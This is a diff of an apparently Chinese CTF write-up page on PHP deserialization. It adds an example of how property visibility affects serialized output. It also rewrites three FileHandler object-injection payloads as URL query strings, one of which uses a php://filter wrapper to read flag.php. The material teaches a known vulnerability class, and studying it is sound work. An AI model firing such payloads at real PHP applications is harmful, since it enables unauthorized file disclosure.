@@ -374,8 +374,21 @@ Web漏洞-PHP反序列化
 </ul>
 <h4 id="访问修饰符序列化后的区别">访问修饰符序列化后的区别</h4>
 <p><code>public</code>：属性被序列化的时候<strong>属性名</strong>不变；
-<code>protected</code>：属性被序列化的时候属性名会变成<code>%00*%00</code>属性名，长度跟随属性名长度而改变
-<code>private</code>：属性被序列化的时候属性名会变成<code>%00类名%00</code>属性名，长度跟随属性名长度而改变</p>
+<code>protected</code>：属性被序列化的时候属性名会变成<code>%00*%00属性，长度跟随属性名长度而改变</code>
+<code>private</code>：属性被序列化的时候属性名会变成<code>%00类名%00属性名，长度跟随属性名长度而改变</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
+    <span style="color:#66d9ef">public</span> $Username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>;  <span style="color:#75715e">// 序列化后正常
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">protected</span> $skill <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ctr&#34;</span>;    <span style="color:#75715e">// 序列化后多%00*%00，占三个字节的长度
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">private</span> $Password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag&#34;</span>;  <span style="color:#75715e">// 序列化后多%00类名%00，占（两个字节 + 类名的长度）字节
+</span><span style="color:#75715e"></span>
+}
+$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($a);
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><pre><code>O:4:&quot;User&quot;:3:{s:8:&quot;Username&quot;;s:5:&quot;admin&quot;;s:8:&quot;%00*%00skill&quot;;s:3:&quot;ctr&quot;;s:14:&quot;%00User%00Password&quot;;s:4:&quot;flag&quot;;}
+</code></pre><hr>
 <p>注：这里的%00也就是表示空字符（即空格），在url中用%00表示，在hex中表示\x00【%00和\x00也就是我们常说的00截断】</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># 像这种整型长度就位零
 </span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
@@ -496,7 +509,7 @@ $e<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;
 <li>回到题目：由于反序列化会自动执行一次析构函数，并且由题目源码可知flag在flag.php中，考虑魔术函数__destruct() 和 __construct()，还有一个类FileHandler，含有三个属性，分别为op，filename，content。</li>
 <li>梳理一下函数执行及判断调用流程：如果创建一个类对象那么就会调用__construct构造函数 → proces函数 → 判断op的值 →为1则执行write函数，为2则执行read函数【<strong>明显这才是我们需要掉的函数</strong>】；</li>
 <li>析构函数会将op的值设置为1 → 调用process函数；【<strong>解题关键</strong>】</li>
-<li>输入一个字符串，如果有效那么久执行反序列化操作。</li>
+<li>输入一个字符串，如果有效那么就执行反序列化操作。</li>
 </ol>
 <p><strong>GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间</strong></p>
 <ul>
@@ -514,10 +527,11 @@ $e<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;
 }
 $a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileHandler</span>();
 <span style="color:#66d9ef">echo</span>  <span style="color:#a6e22e">serialize</span>($a);
-</code></pre></div><ol>
-<li>O:11:&ldquo;FileHandler&rdquo;:3:{s:2:&ldquo;op&rdquo;;i:2;s:8:&ldquo;filename&rdquo;;s:8:&ldquo;flag.php&rdquo;;s:7:&ldquo;content&rdquo;;N;}  这个payload需要把最后的 <code>}</code> 去掉</li>
-<li>O:11:&ldquo;FileHandler&rdquo;:3:{s:2:&ldquo;op&rdquo;;i:2;s:8:&ldquo;filename&rdquo;;s:8:&ldquo;flag.php&rdquo;;s:7:&ldquo;content&rdquo;;s:4:&ldquo;yyds&rdquo;;} 完整的反序列化</li>
-<li>O:11:&ldquo;FileHandler&rdquo;:3:{s:2:&ldquo;op&rdquo;;i:2;s:8:&ldquo;filename&rdquo;;s:57:&ldquo;php://filter/read=convert.base64-encode/resource=flag.php&rdquo;;s:7:&ldquo;content&rdquo;;s:4:&ldquo;yyds&rdquo;;}</li>
+</code></pre></div><p>// 直接丢url上</p>
+<ol>
+<li>?str=O:11:&ldquo;FileHandler&rdquo;:3:{s:2:&ldquo;op&rdquo;;i:2;s:8:&ldquo;filename&rdquo;;s:8:&ldquo;flag.php&rdquo;;s:7:&ldquo;content&rdquo;;N;}  这个payload需要把最后的 <code>}</code> 去掉</li>
+<li>?str=O:11:&ldquo;FileHandler&rdquo;:3:{s:2:&ldquo;op&rdquo;;i:2;s:8:&ldquo;filename&rdquo;;s:8:&ldquo;flag.php&rdquo;;s:7:&ldquo;content&rdquo;;s:4:&ldquo;yyds&rdquo;;} 完整的反序列化</li>
+<li>?str=O:11:&ldquo;FileHandler&rdquo;:3:{s:2:&ldquo;op&rdquo;;i:2;s:8:&ldquo;filename&rdquo;;s:57:&ldquo;php://filter/read=convert.base64-encode/resource=flag.php&rdquo;;s:7:&ldquo;content&rdquo;;s:4:&ldquo;yyds&rdquo;;}</li>
 </ol>
 <p>答案：</p>
 <ul>
